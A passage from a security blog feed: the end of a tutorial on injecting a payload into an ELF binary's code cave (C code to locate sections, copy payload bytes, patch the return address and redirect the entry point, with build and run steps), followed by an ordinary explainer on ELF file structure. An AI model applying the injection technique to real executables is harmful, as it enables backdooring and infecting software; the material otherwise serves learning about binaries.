&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;		Create a list that would fit all the section strings.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;			
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Elf64_Shdr &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;sec_strtab 			 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;elf_sec[ehdr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_shstrndx];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; sec_strtab_ptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr_elf &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sec_strtab&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_offset; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Searching for %s section.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, query);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;	*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; total_sec; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sec_strtab_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; elf_sec[i].sh_name;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;strcmp(sname, query))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] %s section found.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, query);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;elf_sec[i];	
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		} 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In order to get the section names we need to access the String Header Section Table (&lt;code&gt;.shstrtab&lt;/code&gt;) in the ELF file. That table stores all the section names required for the executable. Now that we clarified that, we can move on and see what the next part of the code does. So, we get a pointer to the .shstrtab by adding the specific offset to the beginning of the file. Then, we iterate over all the sections in the ELF file and retrieve the name of the section by adding to the &lt;code&gt;sec_strtab_ptr&lt;/code&gt; the index where the name resides.&lt;/p&gt;
&lt;h3 id=&#34;processing-the-payload&#34;&gt;Processing The Payload&lt;/h3&gt;
&lt;p&gt;After we know where the &lt;code&gt;.text&lt;/code&gt; section of the payload is, we can check to see if the payload fits into the padding found earlier. Then copy the payload code at the end of the &lt;code&gt;.text&lt;/code&gt; section in the target file, using the offset returned by the &lt;code&gt;find_codecave&lt;/code&gt; function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// If the payload is to big to fit in the codecave, exit.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; cave_size)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		perror(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Payload to big to inject.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		close(target_fd);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		close(payload_fd);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Inject payload
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	memmove(data &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; txt_end, data1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_offset, p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_size);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;finishing-it-up&#34;&gt;Finishing it up&lt;/h2&gt;
&lt;p&gt;Finally, with a little help of pointer dancing and the &lt;code&gt;patch_target&lt;/code&gt; function, we can change the entry point of the file with the evil one and replace the placeholder with the original entry point. I will not include the code here since this is basically just scanning the whole code of the payload, searching for the pattern passed by the second argument and replacing it with the entry point passed by the 4th argument.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Patch the return address after executing the payload
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;patch_target(data &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; txt_end, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1111111111111111&lt;/span&gt;, p_txt_sec_ptr&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;sh_size, (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)e_point);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Change entry point
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;elf_header&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_entry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (Elf64_Addr)(base &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; txt_end);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;proof-of-concept&#34;&gt;Proof of concept&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Just compile the elf injector like any other normal C program: &lt;code&gt;gcc elf_inejctor.c -o elf&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Generate the payload: &lt;code&gt;nasm -f elf64 -o payload.o payload.asm &amp;amp;&amp;amp; ld -o payload payload.o&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;RUN IT!: &lt;code&gt;./elf ls payload&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: If you want to inspect the code more carefully you can check it &lt;a href=&#34;https://github.com/vlagh3/elij&#34;&gt;@ my github&lt;/a&gt; as always&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;final-words&#34;&gt;Final words&lt;/h1&gt;
&lt;p&gt;In this article I have shown you a simple way of executing arbitrary code on an ELF file by injecting it.
I hope you enjoyed and now you can see how many things you can do if you master the ELF file structure.
I will come back with more things on ELF files because I have some ideas for the future. Until then, think of your own implementations!
Thank you for reading, and I will see you next time !&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Exploring the ELF file structure</title>
      <link>https://vlagh3.github.io/posts/elf_struct/</link>
      <pubDate>Tue, 14 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/posts/elf_struct/</guid>
      <description>Hello folks, hope you are all doing well because today we are going to talk about ELF files, but don’t be scared. Even if this topic offers a huge amount of information, I will try to make it as simple and fun as I can. With that being said, let’s talk a bit about the structure of this article. It will be split into the following parts:
General Information The anatomy of an ELF file Missconsceptions Linking and executing ELF Header Program headers Section headers Creating your own readelf Conclusion General Information So first of all, why would you want to bother learning about a specific file format that was adopted as a system default in UNIX almost 20 years ago?</description>
      <content>&lt;p&gt;Hello folks, hope you are all doing well because today we are going to talk about ELF files, but don’t be scared. Even if this topic offers a huge amount of information, I will try to make it as simple and fun as I can. With that being said, let’s talk a bit about the structure of this article. It will be split into the following parts:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;General Information
The anatomy of an ELF file
  Missconsceptions
  Linking and executing
  ELF Header
  Program headers
  Section headers
Creating your own readelf
Conclusion
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;general-information&#34;&gt;General Information&lt;/h1&gt;
&lt;p&gt;So first of all, why would you want to bother learning about a specific file format that was adopted as a system default in UNIX almost 20 years ago?&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Well, this will help you understand better the inner workings of your operating system, thus giving you the answer to the known questions like why/what happened.&lt;/li&gt;
&lt;li&gt;You will be able to research ELF files, thus helping you in forensics.&lt;/li&gt;
&lt;li&gt;For a better understanding while developing.&lt;/li&gt;
&lt;li&gt;If you want to dive into reverse engineering and exploitation, this will come in handy.&lt;/li&gt;
&lt;li&gt;You will have another tool to play around with and maybe discover new creative ways to reap the benefit out of it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope that I got you excited, so let’s jump into it.&lt;/p&gt;
&lt;h2 id=&#34;how-a-process-is-created&#34;&gt;How a process is created&lt;/h2&gt;
&lt;p&gt;So whatever OS you are using, the idea is basically the same. In order to execute commands, the CPU, needs some specific language , also known as assembly/machine code. The OS is making this possible by translating common functions &lt;em&gt;( as simple as printing something to the screen )&lt;/em&gt; in assembly language. So, instead of talking directly to the CPU, we use a programming language, with internal functions. A compiler then translates these internal functions into object code.&lt;/p&gt;
&lt;p&gt;The object code is then linked &lt;em&gt;(with the help of a linker tool)&lt;/em&gt; into a full program. Thus, resulting a binary file, which can be executed on the specific platform and CPU type.&lt;/p&gt;
&lt;h1 id=&#34;the-anatomy-of-an-elf-file&#34;&gt;The anatomy of an ELF file&lt;/h1&gt;
&lt;p&gt;ELF stands for Executable and Linkable Format and it’s a common standard file format in UNIX systems. It is very flexible and extensible, for example it doesn’t exclude any particular CPU or ISA, allowing it to be adopted by many different hardware platforms and OS. A lot of people think that ELF files are just binaries and executables, but as discussed earlier we have already seen that it was used as an object file. Also, it can be used for shared libraries, core dumps and even for kernel modules !&lt;/p&gt;
&lt;p&gt;Ok, so let’s start with a general layout on how a typical ELF file is structured:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;   Linking View            Execution View

+-----------------+     +-----------------+
|  ELF header     |     |  ELF header     |
+-----------------+     +-----------------+
|  Program header |     |  Program header |
|  table (opt.)   |     |  table          |
+-----------------+     +-----------------+
|    Section 1    |     |                 |
+-----------------+     |    Segment 1    |
|       ...       |     |                 |
+-----------------+     +-----------------+
|    Section n    |     |                 |
+-----------------+     |    Segment 2    |
|       ...       |     |                 |
+-----------------+     +-----------------+
|       ...       |     |       ...       |
+-----------------+     +-----------------+
|  Section header |     |  Section header |
|  table          |     |  table (opt.)   |
+-----------------+     +-----------------+
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;As you can see, an ELF file has two different views and both of them have always 2 permanent headers:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ELF header &lt;em&gt;(ELF32_Ehdr/ELF64_Ehdr)&lt;/em&gt; and the section header &lt;em&gt;(Elf32_Shdr/Elf64_Shdr)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;ELF header &lt;em&gt;(ELF32_Ehdr/ELF64_Ehdr)&lt;/em&gt; and the program header &lt;em&gt;(Elf32_Phdr/Elf64_Phdr)&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The first one &lt;em&gt;(Linking View)&lt;/em&gt; is divided into sections and it’s used when linking of a library or program takes place. The sections contain data about object files like: instructions, debugging information, symbols or relocation information.&lt;/p&gt;
&lt;p&gt;The second one &lt;em&gt;(Execution view)&lt;/em&gt; is divided into segments and it’s used during program execution.
We will discuss more about them later. For now, let’s focus on the ELF header.&lt;/p&gt;
&lt;h2 id=&#34;the-elf-header&#34;&gt;The ELF Header&lt;/h2&gt;
&lt;p&gt;The header that is always present in both states it’s the ELF header and it’s defined as follows:&lt;/p&gt;

  &lt;img src=&#34;https://vlagh3.github.io/img/struct_ehdr.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;This structure is not very difficult to understand. It contains all the information for the binary within its very first bytes. Let’s quickly go through the first 6 attributes of the structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;E_indent : initial magic bytes that provide an answer for the OS on how to interpret and decode the files content.
E_type   : identifies the object file type (executable, shared object, relocatable, etc)
E_machine: specifies the required architecture
E_version: specifies the current version (usually that’s 1)
E_ehsize : specifies the ELF header’s size
E_entry  : specifies the virtual address at which the system transfers the control first, thus starting the process. You can think of it as the main function, even if it’s more complicated than that.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The next values all specify certain offsets, size, address values for the section header and program header values which I will come back later.
The program header&lt;/p&gt;
&lt;h2 id=&#34;the-program-header&#34;&gt;The program header&lt;/h2&gt;
&lt;p&gt;The program header describes segments within the binary that are necessary for program loading.
These segments contain one or more sections describing the memory layout, on the disk, of an executable and how it should be loaded into memory.
Since they are managing the creation of the process image, a program header becomes mandatory for executable files, but it’s optional for shared objects. That’s because a relocatable or shared object file(*.o) is meant to be linked into an executable, but not meant to be loaded into memory.&lt;/p&gt;
&lt;p&gt;The program header structure looks like this:&lt;/p&gt;

  &lt;img src=&#34;https://vlagh3.github.io/img/struct_phdr.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;pre&gt;&lt;code&gt;P_type   : This attribute is specifying the type of the segment (e.g dynamic linking tables)
P_offset : Gives the offset from the beginning of the file at which the first byte of the segment resides
P_vaddr  : Gives the virtual address at which the segment will be loaded into memory
P_paddr  : For systems which physical addressing is relevant, this member is reserved for the segment’s physical address.
P_filesz : Contains the size of the file image of the segment
P_memsz  : Contains the number of bytes in the memory image of the segment
P_flags  : This attribute gives flags relevant to the segment (e.g read, write, execute)
P_align  : Some alignment bytes with the power of 2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Since a program has multiple program segments, the ELF gives us all the information about where and how many of them exist in the ELF header:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;E_phoff    &lt;/code&gt;: Offset to the start of the program header table&lt;/li&gt;
&lt;li&gt;&lt;code&gt;E_phentsize&lt;/code&gt;: Contains the size of a single program header table entry&lt;/li&gt;
&lt;li&gt;&lt;code&gt;E_phnum    &lt;/code&gt;: Contains the total number of entries in the program header table&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;common-program-headers&#34;&gt;Common program headers:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_LOAD&lt;/code&gt;: This is always present in an executable and there will be at least one of these. It’s describing a loadable segment which is mapped into memory.
Generally a basic dynamically linked ELF executable will have 2 of these segments:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;one for the text segment &lt;em&gt;(the actual program code)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;another one for global vars, data segment and other dynamic linking information&lt;/li&gt;
&lt;li&gt;the memory alignment will be specified by the &lt;code&gt;p_align&lt;/code&gt; member&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_NOTE&lt;/code&gt;: This type of segment it’s used by specific vendors/systems for marking an object file with special information that other programs will check for conformance, compatibility, etc.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;it can hold any amount of entries.&lt;/li&gt;
&lt;li&gt;each of the entries are an array of 4-byte words with the processor specific endianess in mind.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_INTERP&lt;/code&gt; This program header element it’s useful for the system at execution time. The program retrieves the path name from it and creates the initial process image. Then is the interpreter’s responsibility to receive control from the system and provide an environment for the application program.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;from my local &lt;code&gt;/bin/ps&lt;/code&gt; we can find where the &lt;code&gt;PT_INTERP&lt;/code&gt; segment is located with the help of &lt;code&gt;readelf –l /bin/ps&lt;/code&gt;. After, we can use &lt;code&gt;hexdump&lt;/code&gt; with the offset retrieved earlier to see its content.

  &lt;img src=&#34;https://vlagh3.github.io/img/iterp.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/li&gt;
&lt;li&gt;as you can see, in the example above the linker used is the ld-linux-x86-64, since our executable is 64-bit.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;PT_PHDR&lt;/code&gt;: This one holds the location and size of the program header table itself.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;GNU_EH_FRAME&lt;/code&gt;: This is a sorted queue used by the GNU C compiler. It stores exception handlers. So, when something goes wrong, this area can be used to deal with it correctly.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;GNU_STACK&lt;/code&gt;: It’s used to store stack information. This is a somewhat important segment for exploit development, because if the stack is executable and you apply a little memory manipulation magic, it may bring to some really serious security problems. So, if the GNU_STACK segment is not available, then usually it’s used an executable stack.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;section-headers&#34;&gt;Section headers&lt;/h2&gt;
&lt;p&gt;As we have spoken earlier, the segments from the program header table are necessary for an executable to run. Each of those segments have sections that are needed during linking time. The sections can be found in the section header table &lt;em&gt;(this is basically an array of Elf32_Shdr/Elf64_Shdr structures)&lt;/em&gt; and each of these store information needed for the dynamic linker such as: symbols, global variables, etc. Also, they are referencing the size and location of them. They are not needed for correct program execution whereas program headers are.&lt;/p&gt;
&lt;p&gt;This is possible because they are not helping to load and map any memory layout into the binary. Thus, you can strip off the sections, but the executable will be much harder to reverse/debug.
Let’s see how the &lt;code&gt;Elf32_Shdr/Elf64_Shdr&lt;/code&gt; structure look:&lt;/p&gt;

  &lt;img src=&#34;https://vlagh3.github.io/img/struct_shdr.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;pre&gt;&lt;code&gt;Sh_name    : This member holds an offset to the name of the section. It’s value is an index into the .shstrtab (Section Header String Table).
Sh_type    : This member categorizes the sections’s content and semantics. (e.g  SHT_RELA=holds relocation entries,  SHT_SYMTAB=holds a symbol table)
Sh_flags   : Specifies a 1-bit flag such as: SHF_WRITE(writable), SHF_ALLOC(occupies memory during execution)
Sh_addr    : If the section will be in the memory image of the process, this member is holding the address where it will reside.
Sh_offset  : Is holding the offset from the beginning of the file to the section.
Sh_size    : Is holding the size of the section in bytes
Sh_link    : Points to another section
Sh_info    : This member holds extra information about the section.
Sh_entsize : Contains the size of each entry, for sections that contain fixed-sized entries.
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;common-sections&#34;&gt;Common sections&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.text&lt;/code&gt;: Contains the program code, this is usually packed within a segment with read and execute permissions &lt;em&gt;(&lt;code&gt;PT_LOAD&lt;/code&gt;)&lt;/em&gt;. Also it will be loaded only once, since the content will not change.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.data&lt;/code&gt;: This section resides in the data segment and it contains initialized data that will contribute to the program’s memory image. (e.g initialized global variables)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.bss&lt;/code&gt;: Same as the .data section but with uninitialized data.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.dynsym&lt;/code&gt;: Holds the dynamic linking symbols table imported from shared libraries (e.g exit from libc) that are dynamically loaded at runtime.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.debug&lt;/code&gt;: Holds information for symbolic debugging&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.dynamic&lt;/code&gt;: Holds dynamic linking information&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.plt&lt;/code&gt;: Holds the procedure linkage table. This is used to call functions from used shared libraries.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.got.plt&lt;/code&gt;: This goes hand in hand with .plt section to dynamically resolve and guide the program to the correct address of the imported shared libraries functions.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.rodata&lt;/code&gt;: Contains read-only data such as strings from code that look like this perror(“Error occurred !”).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.hash&lt;/code&gt;: This section holds a symbol hash table.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.symtab&lt;/code&gt;: The .symtab section contains all symbols from .dynsym as well as local symbols for the executable. This is mainly used for debugging.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.strtab&lt;/code&gt;: Contains the symbol string table that is references by an entry within &lt;code&gt;ElfN_Sym&lt;/code&gt; structs.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.shstrtab&lt;/code&gt;: Contains the section header string table that is used to resolve names for each section. More precise, in here are the string values for the &lt;code&gt;sh_name&lt;/code&gt; field from the section header struct. They can be accessed via an index/offset added on the &lt;code&gt;sh_offset&lt;/code&gt; of this section.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.ctors/.dtors&lt;/code&gt;: The .ctors &lt;em&gt;(constructors)&lt;/em&gt; and .dtors &lt;em&gt;(destructors)&lt;/em&gt; sections contain function pointers to initialization and finalization code that is to be executed before and after the actual &lt;code&gt;main()&lt;/code&gt; body of program code.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The ELF header provides the needed information to find the location and the number of sections (same as the program header)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  E_shoff     : Offset to the start of the section header table
  E_shnum     : Specifies how many section headers are in the section program header
  E_shentsize : Specifies the size of one section header.
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: You can calculate the total size of the program header/section header by multypling &lt;code&gt;E_shnum/E_phnum * E_shentsize/E_phentsize&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;creating-your-own-readelf&#34;&gt;Creating your own readelf&lt;/h1&gt;
&lt;p&gt;Now, that we have covered all the information needed, you are probably thinking what can we do with that. The first thing that popped into my mind was to recreate the functionality of readelf. Basically, the tool is just inspecting the bytes from the ELF Header, Section Header and Program Header and it’s interpreting the data in a human readable form.
So, I started to build my own one that is doing exactly the same thing in order to understand even better all the structures and the format itself.&lt;/p&gt;
&lt;p&gt;Let’s start by interpreting the theory that we have learned and get a better visual representation of it.
I wanted to make things easy, so we will take a look at the &lt;code&gt;/bin/ps&lt;/code&gt; as our experimental rat. And it’s looking like that:

  &lt;img src=&#34;https://vlagh3.github.io/img/file_ps.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;We are dealing with a 64-bit binary, so we need to keep in mind the appropriate data types and the overall size of each structure!
The ELF header is going to be 64 bytes long. With that knowledge, we can display the first 64 bytes with &lt;code&gt;hexdump&lt;/code&gt; and see the following:

  &lt;img src=&#34;https://vlagh3.github.io/img/elf_header.png&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;

&lt;/p&gt;
&lt;p&gt;If you go back and look at the &lt;code&gt;Elf64_Ehdr&lt;/code&gt; structure we can easily translate the bytes to the corresponding attributes:

